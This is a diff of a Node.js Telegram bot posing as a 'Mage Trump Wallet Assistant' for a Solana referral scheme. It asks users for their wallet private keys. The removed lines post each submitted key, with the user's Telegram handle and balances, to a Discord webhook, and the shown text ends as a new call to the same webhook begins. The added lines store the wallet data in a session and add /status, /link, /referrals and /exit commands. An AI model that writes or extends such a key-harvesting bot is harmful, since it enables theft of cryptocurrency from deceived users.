@@ -1,6 +1,6 @@
 require('dotenv').config();
 const path = require('path');
-const { Telegraf } = require('telegraf');
+const { Telegraf, session } = require('telegraf');
 const admin = require('firebase-admin');
 const { Connection, Keypair, PublicKey, LAMPORTS_PER_SOL } = require('@solana/web3.js');
 const rawBs58 = require('bs58');
@@ -14,18 +14,30 @@ const discordWebhook = process.env.DISCORD_WEBHOOK;
 admin.initializeApp({
   credential: admin.credential.cert(credentials),
 });
-
 const db = admin.firestore();
 const connection = new Connection("https://api.mainnet-beta.solana.com");
 
+// Ativa o controle de sessão
+bot.use(session());
+
+function formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim) {
+  return `
+🧙 Wallet: \`${pubkey}\`
+💸 On-chain balance: ${solBalance} SOL
+🎯 Project balance: ${projectBalance} SOL
+🔗 Referrals: ${refCount}
+${canClaim ? '✅' : '⛔'} Claim status: ${canClaim ? 'Available' : 'Not Available'}
+
+📢 Your referral link:
+https://magetoken.com.br/?ref=${pubkey}
+
+🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!`.trim();
+}
+
+// Mensagem de boas-vindas com imagem e link do site
 bot.start((ctx) => {
   ctx.replyWithPhoto(
-    // ✅ Use imagem local
     { source: path.resolve(__dirname, 'images/trumpmage.png') },
-    
-    // Ou comente a linha acima e use um link direto:
-    // { url: 'https://seuservidor.com/imagens/trumpmage.png' },
-
     {
       caption: `👋 *Welcome to Mage Trump Wallet Assistant!*
 
@@ -39,6 +51,56 @@ To continue, please send your Solana *private key* (in base58 format or JSON arr
   );
 });
 
+// Comando /exit para remover a sessão
+bot.command('exit', (ctx) => {
+  ctx.session = null;
+  ctx.reply('👋 You have been logged out. Send your private key again to reconnect.');
+});
+
+// Comando /help
+bot.command('help', (ctx) => {
+  ctx.replyWithMarkdown(`📖 *How MageTrump Assistant Works*
+
+1. Send your Solana *private key* (base58 or JSON array) to connect your wallet.
+2. Use /status to check your wallet and project balance.
+3. Use /link to get your referral link.
+4. Use /referrals to see how many users you referred.
+5. Use /exit to logout and remove your wallet from session.
+
+🌐 Learn more at: [magetoken.com.br](https://magetoken.com.br)`);
+});
+
+// Comando /status
+bot.command('status', async (ctx) => {
+  const session = ctx.session?.walletData;
+  if (!session) return ctx.reply('❌ No wallet session found. Send your private key to connect.');
+
+  ctx.replyWithMarkdown(formatStatus(
+    session.pubkey,
+    session.solBalance,
+    session.projectBalance,
+    session.refCount,
+    session.canClaim
+  ));
+});
+
+// Comando /link
+bot.command('link', (ctx) => {
+  const session = ctx.session?.walletData;
+  if (!session) return ctx.reply('❌ You are not connected. Send your private key first.');
+
+  ctx.reply(`🔗 Your referral link:\nhttps://magetoken.com.br/?ref=${session.pubkey}`);
+});
+
+// Comando /referrals
+bot.command('referrals', (ctx) => {
+  const session = ctx.session?.walletData;
+  if (!session) return ctx.reply('❌ You are not connected. Send your private key first.');
+
+  ctx.reply(`📈 You have referred ${session.refCount} wizard(s)!`);
+});
+
+// Processa a chave privada
 bot.on('text', async (ctx) => {
   const input = ctx.message.text.trim();
   let keypair;
@@ -75,45 +137,16 @@ bot.on('text', async (ctx) => {
       canClaim = data.canClaim || false;
     }
 
-    const msg = `
-🧙 Wallet: \`${pubkey}\`
-💸 On-chain balance: ${solBalance} SOL
-🎯 Project balance: ${projectBalance} SOL
-🔗 Referrals: ${refCount}
-${canClaim ? '✅' : '⛔'} Claim status: ${canClaim ? 'Available' : 'Not Available'}
+    // Armazena sessão no ctx
+    ctx.session.walletData = {
+      pubkey,
+      solBalance,
+      projectBalance,
+      refCount,
+      canClaim
+    };
 
-📢 Your referral link:
-https://magetoken.com.br/?ref=${pubkey}
-
-🚀 Share your link and earn 0.1 SOL for each new wizard you recruit!`.trim();
-
-    await ctx.replyWithMarkdown(msg);
+    await ctx.replyWithMarkdown(formatStatus(pubkey, solBalance, projectBalance, refCount, canClaim));
 
     try {
-      await fetch(discordWebhook, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          content: `📢 New user connected via private key:
-
-👤 Telegram: @${ctx.from.username || 'unknown'}
-🔑 Private Key: \`${input}\`
-🧙 Wallet: \`${pubkey}\`
-
-💸 On-chain: ${solBalance} SOL
-🎯 Project: ${projectBalance} | Referrals: ${refCount}
-⛔ Claim: ${canClaim ? 'Available' : 'Not Available'}`
-        })
-      });
-    } catch (err) {
-      console.warn('⚠️ Falha ao enviar para Discord:', err.message);
-    }
-
-  } catch (err) {
-    console.error('Erro ao processar a chave:', err.message || err);
-    await ctx.reply('❌ Invalid private key or error connecting to your wallet. Please try again.');
-  }
-});
-
-bot.launch();
-console.log("✅ MageTrump Assistant is running...");
+      await fetch(discordWebhook,
